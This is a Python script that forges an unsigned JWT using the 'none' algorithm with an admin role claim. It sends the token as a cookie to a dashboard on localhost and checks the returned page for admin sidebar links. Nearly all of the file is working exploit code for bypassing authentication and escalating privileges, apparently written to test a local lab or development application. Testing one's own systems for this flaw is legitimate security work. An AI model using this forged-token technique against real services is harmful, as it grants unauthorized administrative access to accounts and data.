#!/usr/bin/env python3
"""Verify if admin tab shows up with forged JWT"""

import json
import base64
import time
import urllib.request
import urllib.error
import sys

# Force UTF-8 output
if sys.stdout.encoding != 'utf-8':
    sys.stdout = open(sys.stdout.fileno(), mode='w', encoding='utf-8', buffering=1)

def b64url_encode(data):
    json_str = json.dumps(data)
    return base64.urlsafe_b64encode(json_str.encode()).rstrip(b'=').decode()

def forge_jwt(customer_id="BS100001"):
    header = {"typ": "JWT", "alg": "none"}
    payload = {
        "sub": customer_id,
        "role": "admin",
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600
    }
    h = b64url_encode(header)
    p = b64url_encode(payload)
    return f"{h}.{p}."

def test_with_jwt():
    base_url = "http://localhost:9443"
    
    # Generate forged admin JWT
    token = forge_jwt("BS100001")
    print("[*] Generated forged JWT:")
    print(f"    {token[:60]}...")
    print()
    
    # Make request to /dashboard with JWT as access_token cookie
    url = f"{base_url}/dashboard"
    print(f"[*] Requesting {url}")
    print(f"[*] Cookie: access_token={token[:40]}...")
    print()
    
    try:
        # Create request with the JWT as a cookie
        req = urllib.request.Request(url)
        req.add_header('Cookie', f'access_token={token}')
        
        with urllib.request.urlopen(req) as response:
            html = response.read().decode('utf-8')
            
            # Check if admin-related content is in the response
            print("[*] Response Analysis:")
            print("-" * 60)
            
            # Check for admin sidebar items
            checks = {
                "admin-dashboard link": 'admin-dashboard' in html,
                "admin-vault link": 'admin-vault' in html,
                "admin-audit link": 'admin-audit' in html,
                "Admin menu item": "['admin'" in html or '"admin"' in html,
            }
            
            for check_name, result in checks.items():
                status = "FOUND" if result else "NOT FOUND"
                print(f"{check_name:30} {status}")
            
            print()
            
            # Search for the specific admin nav pattern
            if "$showAdmin" in html:
                print("[DEBUG] Found $showAdmin in response (PHP not executed)")
            
            # Check for 'role' in response to see if user info is being set
            if '"role"' in html or "'role'" in html:
                print("[*] 'role' found in HTML response")
            
            # Look for the actual admin nav rendering
            print("\n[*] Searching for admin nav rendering patterns...")
            
            # Extract a section of HTML around admin checks
            if "admin-dashboard" in html:
                idx = html.find("admin-dashboard")
                print(f"\nFound 'admin-dashboard' at position {idx}")
                print(f"Context: ...{html[max(0, idx-100):idx+100]}...")
            else:
                print("\n[!] 'admin-dashboard' NOT found in HTML")
                
                # Search for where the navigation would be
                if 'dashboard' in html:
                    print("[*] Regular 'dashboard' nav item IS present")
                
                # Check if any admin-related strings exist
                admin_patterns = ['admin', 'Admin', 'ADMIN', 'admin-']
                found_admin_patterns = [p for p in admin_patterns if p.lower() in html.lower()]
                if found_admin_patterns:
                    print(f"[!] Found admin patterns: {found_admin_patterns}")
            
            print("\n" + "=" * 60)
            
            # Show a snippet of the sidebar section
            if '<aside' in html:
                aside_start = html.find('<aside')
                aside_end = html.find('</aside>', aside_start)
                if aside_end > 0:
                    sidebar = html[aside_start:aside_end+8]
                    print("[*] Sidebar Content (first 1500 chars):")
                    print(sidebar[:1500])
                    print("\n...")
                    
                    # Check for Admin in sidebar
                    if 'Admin' in sidebar or 'admin' in sidebar:
                        print("\n[YES] Admin text found in sidebar!")
                    else:
                        print("\n[NO] No admin text found in sidebar!")
            
    except urllib.error.HTTPError as e:
        print(f"[ERROR] HTTP {e.code}: {e.reason}")
        try:
            error_body = e.read().decode('utf-8')
            print(f"Response: {error_body[:200]}")
        except:
            pass
    except Exception as e:
        print(f"[ERROR] {type(e).__name__}: {e}")

if __name__ == "__main__":
    test_with_jwt()
